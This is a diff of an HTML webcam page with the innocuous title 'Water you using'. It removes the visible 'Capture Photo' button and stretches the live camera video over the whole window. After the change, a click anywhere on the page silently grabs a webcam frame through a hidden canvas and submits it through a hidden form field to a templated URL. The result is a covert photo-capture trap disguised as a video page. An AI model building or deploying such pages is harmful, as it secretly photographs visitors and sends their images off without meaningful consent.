@@ -2,11 +2,35 @@
 <html>
 <head>
     <title>Water you using</title>
+    <style>
+        /* Set body and html to take full height and remove margins */
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* Make the video take the full window */
+        #video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            cursor: pointer; /* Add cursor pointer to indicate clickable */
+        }
+
+        /* Hide canvas initially */
+        #canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <button id="capture">Capture Photo</button>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
     <form id="photo-form" method="POST" enctype="multipart/form-data" action="{{ submit_url }}">
         <input type="hidden" name="image" id="image">
     </form>
@@ -15,7 +39,6 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        const captureButton = document.getElementById('capture');
         const imageInput = document.getElementById('image');
         const photoForm = document.getElementById('photo-form');
 
@@ -26,9 +49,9 @@
             });
         }
 
-        // Capture the photo and submit the form
-        captureButton.addEventListener('click', function() {
-            context.drawImage(video, 0, 0, 640, 480);
+        // Capture the photo and submit the form on click anywhere on the screen
+        document.addEventListener('click', function() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageDataURL = canvas.toDataURL('image/png');
             imageInput.value = imageDataURL;
             photoForm.submit();
